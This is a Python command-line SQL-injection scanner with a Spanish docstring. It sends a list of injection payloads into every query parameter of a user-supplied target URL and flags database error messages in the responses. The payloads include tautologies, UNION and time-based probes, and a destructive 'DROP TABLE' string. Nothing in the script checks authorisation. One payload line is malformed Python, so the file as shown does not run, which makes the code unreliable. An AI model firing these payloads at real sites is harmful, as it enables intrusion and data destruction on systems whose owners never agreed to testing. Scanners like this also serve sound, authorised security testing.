#!/usr/bin/env python3
"""
06 - Detector básico de SQLi en parámetros URL
Uso: python 06_sql_injection_scanner.py "https://target.com/page?id=1"
"""
import sys
import urllib.request
import urllib.parse
import re
from colorama import Fore, init

init(autoreset=True)

PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"\\"=\"",
    "1; DROP TABLE--",
    "' UNION SELECT NULL--",
    "1' AND SLEEP(5)--",
]

ERROR_SIGNATURES = [
    r"sql syntax",
    r"mysql_fetch",
    r"SQLSTATE\[",
    r"ORA-\d{5}",
    r"Microsoft SQL Server",
    r"You have an error in your SQL syntax",
    r"Warning:.*sql",
    r"PostgreSQL.*ERROR",
    r"SQLite3::query",
    r"mysqli_result",
]

def test_url(url: str):
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        print(f"{Fore.RED}[!] URL must have query parameters")
        return False

    params = urllib.parse.parse_qs(parsed.query)
    base_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))

    print(f"{Fore.CYAN}[*] Target: {url}")
    print(f"{Fore.CYAN}[*] Parameters: {list(params.keys())} \n")

    vulnerable = False
    for param, values in params.items():
        for payload in PAYLOADS:
            test_params = dict(params)
            test_params[param] = [payload]
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{base_url}?{test_query}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0 (SQLiScanner)"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    body = resp.read().decode("utf-8", errors="ignore")
                    for pattern in ERROR_SIGNATURES:
                        if re.search(pattern, body, re.IGNORECASE):
                            print(f"{Fore.RED}[!!!] POSSIBLE SQLi DETECTED")
                            print(f"    Param:   {param}")
                            print(f"    Payload: {payload}")
                            print(f"    Pattern: {pattern}")
                            vulnerable = True
                            break
            except Exception as e:
                continue

    if not vulnerable:
        print(f"{Fore.YELLOW}[-] No SQLi signatures detected (may still be blind)")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python 06_sql_injection_scanner.py <url-with-params>")
        sys.exit(1)
    test_url(sys.argv[1])
